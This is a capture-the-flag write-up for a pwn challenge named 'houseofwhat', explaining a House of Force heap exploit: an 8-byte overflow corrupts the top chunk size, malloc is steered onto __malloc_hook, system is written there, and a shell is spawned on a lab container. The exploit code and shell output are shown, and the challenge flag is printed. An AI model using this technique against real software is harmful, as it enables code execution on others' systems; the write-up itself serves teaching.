# Challenge

**Name:** houseofwhat

**Category:** pwn

**Difficulty:** Hard

**Author:** mowemcfc

**Flag:** ISS{h0u53_0f_wh47?_h0u53_0f_f0rc3!!}

## Description

You've been invited to someone's house for dinner, but something feels off...

## Solution

This is a basic example of the [House of Force](https://seclists.org/bugtraq/2005/Oct/118) exploit. I would highly recommend you read this link to understand, as more than likely my description will be insufficient.

The exploit hinges on the fact the `wilderness chunk`'s (or top chunk) size value is not checked for integrity. This means that by corrupting this value, we can trick the allocator into setting the `wilderness pointer` to any arbitrary value we like.

The vulnerability in this program is a very basic 8-byte heap overflow.

```c
        if (option == 2) {
            if (notecount < 4) {
                printf("Size: ");
                note_size = read_num(); < --- ATTACKER PROVIDED SIZE
                note_ptr = (char*)malloc(note_size);
                notes[notecount] = note_ptr;

                printf("Message: ");
                max_alloc = malloc_usable_size(notes[notecount]);
                read(0, notes[notecount], max_alloc+8); < --- OVERFLOW

                notecount++;
                puts("\nNote added!");
```

Specifically, the `read` call will read 8 bytes more than whatever size is provided to `read_num`.

Thus, on our very first `malloc`, we can overflow 8 bytes of the wilderness chunk with 0xffffffffffffff. 

```py
malloc(24, b"A"*24 + p64(0xffffffffffffffff))
```

Next malloc, we provide a specially crafted size value, such that the next malloc will return a pointer to `__malloc_hook` (which is called every time `malloc` is). But before that, we place `/bin/sh` on the stack so that it can be used as an argument.

```py
distance = libc.sym.__malloc_hook - (heap+0x20)
malloc(distance, b"/bin/sh\0")
```

Then, as mentioned, we call malloc again (which returns our `__malloc_hook` pointer), and read the address of `system` into it.

```py
malloc(24, p64(libc.sym.system))
```

At this point `__malloc_hook` now points to `system`, and thus when `malloc` is called, we also call `system`. Whatever argument is provided to `malloc` will also be used as the argument to `system`. 

As `system` expects a pointer, we use the address to the previously mentioned `/bin/sh` string as the size argument, and achieve a shell.

```py
cmd = heap + 0x10
malloc(cmd, b"", True)
```

```shell
[+] Opening connection to 172.17.0.2 on port 3141: Done
[*] libc base @ 0x7f4e57e68000
[*] heap @ 0x559653d60020
[*] Switching to interactive mode
$ ls
flag.txt  houseofwhat  lib
```
